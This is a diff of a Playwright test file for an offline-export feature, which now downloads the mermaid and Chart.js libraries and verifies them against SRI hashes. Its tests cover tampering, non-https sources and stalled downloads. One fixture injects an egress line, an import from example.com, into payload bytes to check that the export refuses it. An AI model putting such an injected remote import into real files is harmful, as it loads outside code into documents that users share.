@@ -1,5 +1,6 @@
 import { test, expect } from "@playwright/test";
 import { execFileSync } from "child_process";
+import crypto from "crypto";
 import fs from "fs";
 import net from "net";
 import path from "path";
@@ -7,7 +8,7 @@ import zlib from "zlib";
 import {
   DEV, SKILL, PYTHON, fileUrl, ready, stageContent, startStaticServer,
   installClipboardCapture, openToolbarMenu, openSidebarExportMenu, addTextComment, readDownload, stageNonShareable,
-  clickSidebarExport, srcsetCandidates, blockVendoredLibs,
+  clickSidebarExport, srcsetCandidates, blockVendoredLibs, routeVendoredLibs, routeTamperedVendoredLibs,
 } from "./helpers.js";
 
 const CONTENT = `
@@ -2014,7 +2015,7 @@ test("Export Offline fails loudly when a rich document has no vendored payload (
   const stripped = before.slice(0, openAt) + before.slice(closeAt + "</script>".length);
   // The document no longer CARRIES the libraries, so removing the payload no longer sheds a
   // megabyte - it sheds a descriptor. Assert the two things that actually matter: the generated
-  // document never held library bytes (CMH-SIZE-03), and the payload element is now gone.
+  // document never held library bytes (CMH-SIZE-08), and the payload element is now gone.
   expect(before).not.toContain("mermaidGzipBase64");
   expect(before).toContain("mermaidUrl");
   expect(stripped).not.toContain('id="cmhVendoredRichLibs">{"encoding"');
@@ -2046,13 +2047,10 @@ test("Export Offline fails loudly when a rich document has no vendored payload (
   }
 });
 
-test("Export Offline works from a right-sized payload carrying only the library the content uses (CMH-SIZE-01)", async ({ page }) => {
-  // Partial payloads are NEWLY reachable now that the payload is carried per library (CMH-SIZE-01),
-  // and the exporter is their only consumer. The Python tests prove which KEYS survive; this proves
-  // the JS side still exports from such a document - inlining the one library it needs, with its
-  // MIT notice, and never demanding the half that was legitimately dropped.
-  test.setTimeout(60000);
-  const CHART_ONLY = `
+// Content that uses Chart.js and NO diagram, so the mermaid half of the payload is dropped by
+// right-sizing and the export never wants a mermaid bundle from any source. Shared so a spec that
+// must drive the Chart.js branch can do it with the network fully blocked.
+const CHART_ONLY_CONTENT = `
 <h1>Chart only</h1>
 <p id="chart-only-note">No diagram anywhere, so the mermaid half of the payload is dropped.</p>
 <figure class="chart" aria-labelledby="chart-only-cap">
@@ -2074,18 +2072,32 @@ test("Export Offline works from a right-sized payload carrying only the library 
 }());
 </script>
 `;
-  const staged = stageContent(CHART_ONLY, { key: "cmh-offline-partial", source: "offline-partial.html" });
+
+test("Export Offline works from a right-sized payload carrying only the library the content uses (CMH-SIZE-01)", async ({ page }) => {
+  // Partial payloads are NEWLY reachable now that the payload is carried per library (CMH-SIZE-01),
+  // and the exporter is their only consumer. The Python tests prove which KEYS survive; this proves
+  // the JS side still exports from such a document - inlining the one library it needs, with its
+  // MIT notice, and never demanding the half that was legitimately dropped.
+  test.setTimeout(60000);
+  const staged = stageContent(CHART_ONLY_CONTENT, { key: "cmh-offline-partial", source: "offline-partial.html" });
 
   // Right-size the staged document exactly the way `finalize` does, through the SHIPPED tool, so
   // this exercises the real artifact rather than a hand-made approximation of one.
   execFileSync(PYTHON, ["tools/authoring/vendored_libs.py", staged.html], { cwd: SKILL, stdio: "pipe" });
   const rightSized = fs.readFileSync(staged.html, "utf8");
   // Assert on the PAYLOAD ELEMENT, not the whole file: the runtime's own JavaScript mentions
-  // `mermaidGzipBase64` as an identifier, so a document-wide check would always find it.
+  // `mermaidUrl` as an identifier, so a document-wide check would always find it. Since CMH-SIZE-08
+  // a library is carried as a URL+integrity DESCRIPTOR rather than as bytes, so the per-library
+  // right-sizing shows up as the chart descriptor surviving and the mermaid one being dropped.
   const payloadAt = rightSized.indexOf('id="cmhVendoredRichLibs"');
   expect(payloadAt).toBeGreaterThan(-1);
   const payloadText = rightSized.slice(payloadAt, rightSized.indexOf("</script>", payloadAt));
-  expect(payloadText).toContain("chartjsGzipBase64");
+  expect(payloadText).toContain("chartjsUrl");
+  expect(payloadText).toContain("chartjsIntegrity");
+  expect(payloadText).not.toContain("mermaidUrl");
+  expect(payloadText).not.toContain("mermaidIntegrity");
+  // And no library bytes in either half - the whole point of CMH-SIZE-08.
+  expect(payloadText).not.toContain("chartjsGzipBase64");
   expect(payloadText).not.toContain("mermaidGzipBase64");
 
   const server = await startStaticServer(staged.dir);
@@ -2115,6 +2127,239 @@ test("Export Offline works from a right-sized payload carrying only the library 
     expect(networkLoadRefs(exportedHtml)).toEqual([]);
   } finally {
     await server.close();
+  }
+});
+
+// The JSON text of a document's vendored payload element.
+function payloadJsonOf(html) {
+  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
+  if (idAt < 0) throw new Error("fixture has no vendored payload");
+  const openEnd = html.indexOf(">", idAt) + 1;
+  const closeAt = html.indexOf("</script>", openEnd);
+  if (openEnd <= 0 || closeAt < openEnd) throw new Error("could not bound the vendored payload");
+  return html.slice(openEnd, closeAt);
+}
+
+const VENDOR_DIR = path.join(DEV, "assets", "vendor");
+
+function vendoredSri(name) {
+  return "sha384-" + crypto.createHash("sha384").update(fs.readFileSync(path.join(VENDOR_DIR, name))).digest("base64");
+}
+
+test("CMH-SIZE-08: a generated document names its libraries instead of embedding them, and the export downloads and verifies them", async ({ page, browser }) => {
+  test.setTimeout(120000);
+  // The viewer never read the vendored bytes - it imports mermaid from the CDN, and an authored
+  // Chart.js arrives as its own CDN script - so the ~1,357 KB of base64 the payload used to carry
+  // was pre-staging a possible future Offline export on every READER. It is now a descriptor: the
+  // pinned URL plus the SRI hash recorded at build time, with the MIT notices still embedded so
+  // compliance never depends on the network. The export downloads and VERIFIES those bytes instead.
+  const staged = stageContent(CONTENT, { key: "cmh-size-descriptor", source: "size-descriptor.html" });
+  const server = await startStaticServer(staged.dir);
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    const payloadText = payloadJsonOf(fs.readFileSync(staged.html, "utf8"));
+    const payload = JSON.parse(payloadText);
+    // No library bytes, in either half. This is the whole win, so assert absence of the KEY rather
+    // than of a substring the runtime also mentions as an identifier.
+    expect(payload).not.toHaveProperty("mermaidGzipBase64");
+    expect(payload).not.toHaveProperty("chartjsGzipBase64");
+    // What replaced them: a pinned https URL and the hash of the very bytes this build vendored, so
+    // verification compares against something this repository controls, not against the CDN.
+    expect(payload.mermaidUrl).toMatch(/^https:\/\/cdn\.jsdelivr\.net\/npm\/mermaid@[0-9][^/]*\/dist\/mermaid\.min\.js$/);
+    expect(payload.chartjsUrl).toMatch(/^https:\/\/cdn\.jsdelivr\.net\/npm\/chart\.js@[0-9][^/]*\/dist\/chart\.umd\.min\.js$/);
+    expect(payload.mermaidIntegrity).toBe(vendoredSri("mermaid.min.js"));
+    expect(payload.chartjsIntegrity).toBe(vendoredSri("chart.umd.min.js"));
+    // The MIT notices stay EMBEDDED in the document, so an export is a compliant redistribution
+    // even though the code itself now arrives over the wire.
+    expect(payload.mermaidLicense).toContain("Permission is hereby granted, free of charge");
+    expect(payload.chartjsLicense).toContain("Permission is hereby granted, free of charge");
+    // A descriptor, not a bundle. The old payload was over 1,357 KB.
+    expect(payloadText.length).toBeLessThan(10 * 1024);
+
+    // Count the downloads on the pinned URLs: this is the direct evidence that the FETCH supplied
+    // the bytes, rather than some copy still hiding in the document.
+    const fetched = [];
+    page.on("request", (request) => {
+      if (/cdn\.jsdelivr\.net\/npm\/(mermaid@[^/]+\/dist\/mermaid\.min\.js|chart\.js@[^/]+\/dist\/chart\.umd\.min\.js)$/.test(request.url())) {
+        fetched.push(request.url());
+      }
+    });
+    await routeRichContentLocal(page);
+    await installDownloadTextCapture(page);
+    await page.goto(server.url + "/test-doc.html");
+    await ready(page);
+    // Reading the document must not download the libraries: a speculative megabyte on every reader
+    // is the cost this change exists to remove.
+    expect(fetched, "opening the document downloads no library").toEqual([]);
+
+    await openToolbarMenu(page);
+    const [download] = await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
+    const exportedHtml = await capturedDownloadText(page);
+    expect(fetched.filter((u) => /mermaid/.test(u)), "exporting downloads mermaid once").toHaveLength(1);
+    expect(fetched.filter((u) => /chart\.js/.test(u)), "exporting downloads Chart.js once").toHaveLength(1);
+
+    // The verified bytes are inlined with their notices, and the result is still zero-network.
+    expect(exportedHtml).toContain('data-cmh-offline-lib="mermaid"');
+    expect(exportedHtml).toContain('data-cmh-offline-lib="chartjs"');
+    expect(exportedHtml).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
+    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");
+    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/chart.js");
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+
+    const exportedPath = path.join(outDir, "size-descriptor-offline.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+
+    // What was downloaded really is a working library: the exported file renders the diagram and the
+    // chart with the browser offline, which is the promise the fetch has to keep.
+    ctx2 = await browser.newContext({ offline: true });
+    const page2 = await ctx2.newPage();
+    const external = [];
+    page2.on("request", (request) => {
+      if (/^https?:\/\//.test(request.url())) external.push(request.url());
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    await expect(page2.locator("#commentRoot pre.mermaid svg").first()).toBeVisible();
+    await expect(page2.locator("canvas#offlineChart")).toBeVisible();
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    await server.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
+test("CMH-SIZE-08: a library the export cannot download or verify is refused loudly, with no file written", async ({ page }) => {
+  test.setTimeout(180000);
+  // Moving the bytes off the document moves them onto the network, so every way that can go wrong
+  // has to fail CLOSED and SAY SO. Writing a download whose diagrams will never render, or - far
+  // worse - inlining whatever the network happened to return, are both silent failures the reader
+  // would only discover after sharing the file. Each message names the library and the actual
+  // problem, so the reader knows whether to reconnect or to regenerate.
+  const cases = [
+    {
+      name: "the download is blocked",
+      route: blockVendoredLibs,
+      expected: /could not download the vendored mermaid bundle[\s\S]*needs network access once[\s\S]*exported file itself stays fully offline/i,
+    },
+    {
+      name: "the downloaded bytes do not match the recorded hash",
+      route: routeTamperedVendoredLibs,
+      expected: /could not verify the vendored mermaid bundle it downloaded[\s\S]*do not match the integrity hash[\s\S]*not inlined/i,
+    },
+    {
+      name: "the recorded hash is malformed, so nothing can be verified against it",
+      // A hash the document cannot be checked against is not a reason to skip the check.
+      build: (html) => withPayloadField(html, "mermaidIntegrity", "sha384-not a real hash"),
+      route: routeVendoredLibs,
+      expected: /malformed integrity hash for the vendored mermaid bundle/i,
+    },
+    {
+      name: "the recorded URL is not https",
+      // The hash would also catch tampering, but the bytes become an inline script in a file the
+      // reader will share, so a downgrade to a tamperable transport is refused outright.
+      build: (html) => withPayloadField(html, "mermaidUrl", "http://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"),
+      route: routeVendoredLibs,
+      expected: /refused a non-https source for the vendored mermaid bundle/i,
+    },
+  ];
+
+  for (const c of cases) {
+    const staged = stageContent(FORGERY_CONTENT, { key: "cmh-size-fetchfail", source: "size-fetchfail.html" });
+    try {
+      if (c.build) fs.writeFileSync(staged.html, c.build(fs.readFileSync(staged.html, "utf8")));
+      await page.unrouteAll({ behavior: "ignoreErrors" });
+      await page.route(/^https?:\/\//, (route) => route.abort());
+      await c.route(page);
+      await expectExportRefused(page, staged, c.expected, c.name);
+    } finally {
+      fs.rmSync(staged.dir, { recursive: true, force: true });
+    }
+  }
+});
+
+test("CMH-SIZE-08: a stalled download is bounded, so the export fails instead of hanging forever", async ({ page }) => {
+  test.setTimeout(90000);
+  // `fetch` has no default timeout, so without an explicit bound a CDN that accepts the connection
+  // and then never answers leaves the reader clicking Export Offline and watching nothing happen -
+  // no download, no error, no way to tell it apart from a slow one. The budget is generous in
+  // production (mermaid's UMD build is ~3.5 MB and killing a working download would be worse than
+  // the hang), so the spec shortens it rather than sitting out two minutes to prove it exists.
+  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-size-stall", source: "size-stall.html" });
+  const downloads = [];
+  try {
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    // Never settle: no fulfill, no abort, no fallback.
+    await page.route(/cdn\.jsdelivr\.net\/npm\/mermaid@[^/]+\/dist\/mermaid\.min\.js$/, () => {});
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await page.evaluate(() => { window.__cmhLibFetchTimeoutMs = 500; });
+    page.on("download", (d) => downloads.push(d));
+    await openToolbarMenu(page);
+    await page.locator("#btnExportOfflineTop").click();
+    await expect(page.locator("#toast")).toContainText(
+      /could not download the vendored mermaid bundle/i, { timeout: 20000 });
+    expect(downloads).toHaveLength(0);
+  } finally {
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+  }
+});
+
+test("CMH-SIZE-08: a legacy document that still carries library bytes exports with no network at all", async ({ page, browser }) => {
+  // Every document generated before this change carries the libraries as gzip+base64. Those
+  // documents must keep exporting EXACTLY as they did - from their own bytes, with no download - or
+  // the change would have broken files already in the wild that it never touches. The network is
+  // blocked outright here, so a fetch could not succeed even if one were attempted.
+  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-size-legacy", source: "size-legacy.html" });
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    const bytes = zlib.gzipSync(fs.readFileSync(path.join(VENDOR_DIR, "mermaid.min.js"))).toString("base64");
+    const legacy = withLegacyPayloadBytes(fs.readFileSync(staged.html, "utf8"), "mermaid", bytes);
+    expect(legacy, "the legacy byte-carrying shape must be staged").toContain("mermaidGzipBase64");
+    fs.writeFileSync(staged.html, legacy);
+
+    // Watch for the EXPORT's pinned UMD URL specifically. The viewer's own CDN import of the
+    // mermaid ESM build is unchanged by this work and is expected on any rich document.
+    const fetched = [];
+    page.on("request", (request) => {
+      if (/cdn\.jsdelivr\.net\/npm\/mermaid@[^/]+\/dist\/mermaid\.min\.js$/.test(request.url())) {
+        fetched.push(request.url());
+      }
+    });
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+    expect(fetched, "a legacy document exports from its own bytes, downloading nothing").toEqual([]);
+    expect(exportedHtml).toContain('data-cmh-offline-lib="mermaid"');
+    expect(exportedHtml).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+
+    const exportedPath = path.join(outDir, "size-legacy-offline.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    ctx2 = await browser.newContext({ offline: true });
+    const page2 = await ctx2.newPage();
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    await expect(page2.locator("#commentRoot pre.mermaid svg").first()).toBeVisible();
+  } finally {
+    if (ctx2) await ctx2.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
   }
 });
 
@@ -2894,6 +3139,11 @@ test("CMH-OFFLINE-07: the vendored payload wins over a copy already in the docum
     fs.writeFileSync(staged.html, html);
 
     await page.route(/^https?:\/\//, (route) => route.abort());
+    // Since CMH-SIZE-08 the payload NAMES the library rather than carrying it, so the export
+    // downloads it. Serving only those two pinned URLs from `assets/vendor/` keeps the rest of the
+    // network blocked, so what this test proves is unchanged: the payload's library wins over the
+    // planted copy, and the exported file is still zero-network.
+    await routeVendoredLibs(page);
     await installDownloadTextCapture(page);
     await page.goto(fileUrl(staged.html));
     await ready(page);
@@ -2947,9 +3197,9 @@ function withPayloadAfterContent(html) {
   return rest.slice(0, bodyEnd) + block + "\n" + rest.slice(bodyEnd);
 }
 
-// Rewrite ONE field of the real payload, leaving the library bytes intact - the shape a minifier or
-// a deliberate edit leaves behind. Parsed and re-serialized rather than pattern-edited so the
-// surrounding megabyte of base64 is untouched.
+// Rewrite ONE field of the real payload, leaving the rest intact - the shape a minifier or a
+// deliberate edit leaves behind. Parsed and re-serialized rather than pattern-edited, so no other
+// field is disturbed.
 function withPayloadField(html, key, value) {
   const idAt = html.indexOf('id="cmhVendoredRichLibs"');
   if (idAt < 0) throw new Error("fixture has no vendored payload to edit");
@@ -2959,6 +3209,26 @@ function withPayloadField(html, key, value) {
   const payload = JSON.parse(html.slice(openEnd, closeAt));
   if (!(key in payload)) throw new Error("fixture payload has no " + key);
   payload[key] = value;
+  return html.slice(0, openEnd) + JSON.stringify(payload) + html.slice(closeAt);
+}
+
+// Turn the generated document's DESCRIPTOR payload back into the LEGACY byte-carrying form for one
+// library. Since CMH-SIZE-08 a fresh document names its libraries instead of embedding them, but
+// the byte path is still live - every document generated before that release carries bytes, and the
+// exporter still honours them with no network at all - so a spec that exercises the byte path has
+// to stage that legacy shape rather than assume the current generator produces it. Asserts the
+// descriptor was there first, so this stops staging anything the day the byte path is retired.
+function withLegacyPayloadBytes(html, lib, bytes) {
+  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
+  if (idAt < 0) throw new Error("fixture has no vendored payload to edit");
+  const openEnd = html.indexOf(">", idAt) + 1;
+  const closeAt = html.indexOf("</script>", openEnd);
+  if (openEnd <= 0 || closeAt < openEnd) throw new Error("could not bound the vendored payload");
+  const payload = JSON.parse(html.slice(openEnd, closeAt));
+  if (!(lib + "Url" in payload)) throw new Error("fixture payload has no " + lib + "Url to replace");
+  delete payload[lib + "Url"];
+  delete payload[lib + "Integrity"];
+  payload[lib + "GzipBase64"] = bytes;
   return html.slice(0, openEnd) + JSON.stringify(payload) + html.slice(closeAt);
 }
 
@@ -3037,6 +3307,7 @@ test("CMH-OFFLINE-08: an authored decoy vendored payload never displaces the rea
   const staged = stageDecoyPayloadDoc("cmh-offline-decoy");
   try {
     await page.route(/^https?:\/\//, (route) => route.abort());
+    await routeVendoredLibs(page);
     await installDownloadTextCapture(page);
     await page.goto(fileUrl(staged.html));
     await ready(page);
@@ -3129,6 +3400,7 @@ test("CMH-OFFLINE-08: no infrastructure payload block survives an export, author
     fs.writeFileSync(staged.html, html);
 
     await page.route(/^https?:\/\//, (route) => route.abort());
+    await routeVendoredLibs(page);
     await installDownloadTextCapture(page);
     await page.goto(fileUrl(staged.html));
     await ready(page);
@@ -3199,6 +3471,10 @@ test("CMH-OFFLINE-08: a vendored library whose MIT notice is missing is refused,
   ];
 
   await page.route(/^https?:\/\//, (route) => route.abort());
+  // The library the notice must accompany is DOWNLOADED since CMH-SIZE-08, so serve it: without
+  // this the export would fail on the blocked download and never reach the notice gate, which is
+  // what this test exists to prove.
+  await routeVendoredLibs(page);
   for (const c of cases) {
     const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-nonotice", source: "offline-nonotice.html" });
     try {
@@ -3254,10 +3530,11 @@ test("CMH-OFFLINE-08: payload bytes carrying egress or a script-data escape are 
     },
     {
       // The gate lives in the one `lib()` chokepoint both libraries go through, so drive the OTHER
-      // branch too rather than trusting that shared call site by inspection.
+      // branch too rather than trusting that shared call site by inspection. Chart-only content, so
+      // the mermaid half is never wanted and the network can stay blocked throughout.
       name: "the Chart.js branch is gated too",
-      content: CONTENT,
-      field: "chartjsGzipBase64",
+      content: CHART_ONLY_CONTENT,
+      lib: "chartjs",
       code: 'import("https://example.com/payload-chart-egress.js");',
       expected: refusal("Chart\\.js"),
     },
@@ -3268,7 +3545,12 @@ test("CMH-OFFLINE-08: payload bytes carrying egress or a script-data escape are 
     const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-payload-egress", source: "offline-payload-egress.html" });
     try {
       const bytes = zlib.gzipSync(Buffer.from("/* cmh-payload-unsafe */ " + c.code)).toString("base64");
-      fs.writeFileSync(staged.html, withPayloadField(fs.readFileSync(staged.html, "utf8"), c.field || "mermaidGzipBase64", bytes));
+      // Staged as a LEGACY byte-carrying payload (CMH-SIZE-08): a freshly generated document names
+      // its libraries instead of embedding them, so unsafe BYTES can only reach the export from a
+      // document generated before that release - which the exporter still honours, and must still
+      // gate. The network stays blocked here on purpose: a byte-carrying payload needs none, so
+      // reaching the refusal at all also proves the legacy path takes no detour through the CDN.
+      fs.writeFileSync(staged.html, withLegacyPayloadBytes(fs.readFileSync(staged.html, "utf8"), c.lib || "mermaid", bytes));
       // Not the generic missing-bundle message: the bundle IS in the document, and the action that
       // fixes it is refreshing the payload, so the refusal has to say so.
       await expectExportRefused(page, staged, c.expected || refusal("mermaid"), c.name);
@@ -3337,6 +3619,7 @@ test("CMH-OFFLINE-08: an authored script that borrows the payload id still count
   try {
     fs.writeFileSync(staged.html, withPayloadAfterContent(fs.readFileSync(staged.html, "utf8")));
     await page.route(/^https?:\/\//, (route) => route.abort());
+    await routeVendoredLibs(page);
     await installDownloadTextCapture(page);
     await page.goto(fileUrl(staged.html));
     await ready(page);
